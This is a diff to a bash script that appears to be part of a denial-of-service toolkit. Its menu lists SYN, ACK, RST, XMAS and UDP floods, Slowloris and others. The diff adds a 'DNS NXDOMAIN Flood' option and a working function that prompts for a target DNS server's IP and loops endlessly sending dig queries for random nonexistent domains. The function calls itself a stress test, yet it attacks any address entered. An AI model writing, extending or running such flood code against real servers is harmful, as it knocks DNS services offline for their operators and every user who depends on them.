@@ -271,7 +271,7 @@ done
 dosmenu()
 {
 #display a menu for the DOS module using bash select
-		dosmenu=("TCP SYN Flood" "TCP ACK Flood" "TCP RST Flood" "TCP XMAS Flood" "UDP Flood" "SSL DOS" "Slowloris" "IPsec DOS" "Distraction Scan" "Go back")
+		dosmenu=("TCP SYN Flood" "TCP ACK Flood" "TCP RST Flood" "TCP XMAS Flood" "UDP Flood" "SSL DOS" "Slowloris" "IPsec DOS" "Distraction Scan" "DNS NXDOMAIN Flood" "Go back")
 	select dosopt in "${dosmenu[@]}"; do
 #TCP SYN Flood DOS
  	if [ "$dosopt" = "TCP SYN Flood" ]; then
@@ -300,6 +300,9 @@ dosmenu()
 #Distraction scan
 	elif [ "$dosopt" = "Distraction Scan" ]; then
 		distractionscan
+#DNS NXDOMAIN Flood
+	elif [ "$dosopt" = "DNS NXDOMAIN Flood" ]; then
+		nxdomainflood
 #Go back
 	elif [ "$dosopt" = "Go back" ]; then
 		mainmenu
@@ -966,6 +969,22 @@ exit 0
 }
 ##END DISTRACTION##
 ###################
+
+#######################
+##START NXDOMAINFLOOD##
+nxdomainflood()
+{ echo "This module is designed to stress test a DNS server by flooding it with queries for domains that do not exist"
+echo "Enter the IP address of the target DNS server:"
+read -i $DNSTARGET -e DNSTARGET
+echo "Starting DNS NXDOMAIN Query Flood to $DNSTARGET" && sleep 1
+while :
+do dig $RANDOM.$RANDOM$RANDOM @$DNSTARGET
+done
+exit 0
+}
+##END NXDOMAINFLOOD##
+#####################
+
 ##/DOS##
 
 
@@ -1197,3 +1216,4 @@ mainmenu
 ##END WELCOME MESSAGE##
 #######################
 ##/WELCOME##
+
